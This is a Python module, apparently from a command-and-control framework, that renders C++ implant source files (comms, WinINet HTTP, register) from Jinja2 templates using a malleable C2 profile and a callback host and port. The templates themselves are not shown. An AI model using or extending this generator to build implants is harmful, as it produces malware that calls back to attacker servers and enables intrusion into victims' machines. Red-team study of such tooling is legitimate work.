import logging
from pathlib import Path

import structlog
from jinja2 import Environment, FileSystemLoader, StrictUndefined
from mpp import *

from ...listeners.malc2 import *
from .context_generators.http_wininet import generate_http_wininet_context

server_logger = logging.getLogger("server")
# this file, up one dir, to templates
TEMPLATE_DIR = Path(__file__).parent / "templates"

env = Environment(
    loader=FileSystemLoader(TEMPLATE_DIR.resolve()),
    # distinct brackets to avoid C++ conflicts
    block_start_string="[%",
    block_end_string="%]",
    variable_start_string="[[",
    variable_end_string="]]",
    comment_start_string="[#",
    comment_end_string="#]",
    # clean up whitespace so generated code looks pro
    trim_blocks=True,
    lstrip_blocks=True,
    undefined=StrictUndefined,  # Fail fast if a var is missing
)


def render_implant(
    output_dir: Path,
    malleable_c2_profile,
    listener_type,
    callback_host,
    callback_port,
    variant,
):

    structlog.contextvars.clear_contextvars()
    structlog.contextvars.bind_contextvars(
        output_dir=output_dir,
        # malleable_c2_path=malleable_c2_path,
        listener_type=listener_type,
    )
    server_logger.debug("_create_implant")

    # 1. Generate the shared context (Data usually needed by ALL files)
    # these are the keys that get plugged into the templates
    # one per listener type for explicitness/control
    match listener_type:
        case "http":
            if variant == "http_wininet":
                global_context = generate_http_wininet_context(
                    malleable_c2_profile, callback_host, callback_port
                )

            # elif...
            else:
                server_logger.error(f"Invalid HTTP variant: {variant}")

        case _:
            server_logger.error(f"Invalid listener type: {listener_type}")
            return

    # 2. Define the File Map
    # Structure: "Destination Path" : "Source Template"
    files_to_render = {}

    # Add Listener Specific files to the render list, based on variant.
    match variant:
        case "http_wininet":
            # render and save to comms.cpp... (high level http funcsd)
            files_to_render[output_dir / "lifecycle/comms.cpp"] = (
                "wininet_comms_http.j2"  # no need to prefix, already searching in templates dir
            )

            # render and save to http.cpp... (this is the lib implemetnation for http)
            files_to_render[output_dir / "protocols/http_wininet/http.cpp"] = (
                "wininet_http.j2"
            )

            # render and save to register.cpp... (this is the high level implemetnation for register)
            files_to_render[output_dir / "lifecycle/register.cpp"] = (
                "wininet_register_http.j2"
            )

        case _:
            server_logger.error(f"Invalid variant type: {variant}")
            raise ValueError(f"Invalid variant type: {variant}")

    """
    output format POC

    match output
        case "exe":
            include main for exe, and cmake for exe
        case "dll": include main for dll, and cmake for dll
    
        # should be pretty easy to have these that just call the "loop" function in main.cpp

    """

    # 3. Execution Loop
    # Iterate over the dict and build everything
    server_logger.info(f"Rendering Implant Files")
    server_logger.debug(f"Rendering files: {files_to_render}")

    for out_file, template_file in files_to_render.items():
        render_file(str(template_file), out_file, global_context)


def render_file(template_file: str, output_path: Path, context: dict):
    """Render a file based on the template provided

    Args:
        template_file (str): Path to template file
        output_path (Path): where to store template output
        context (dict): context to fill in template with

    Raises:
        e: error
    """
    structlog.contextvars.clear_contextvars()
    structlog.contextvars.bind_contextvars(
        template=str(template_file), output_path=str(output_path), context=context
    )
    server_logger.debug("Rendering file")

    try:
        # Load by name
        template = env.get_template(template_file)
        rendered_code = template.render(**context)

        # Ensure output directory exists
        output_path.parent.mkdir(parents=True, exist_ok=True)

        with open(output_path, "w") as f:
            f.write(rendered_code)

        server_logger.debug(f"Rendered successfully")

    except Exception as e:
        server_logger.error(f"Error rendering: {e}")
        raise e
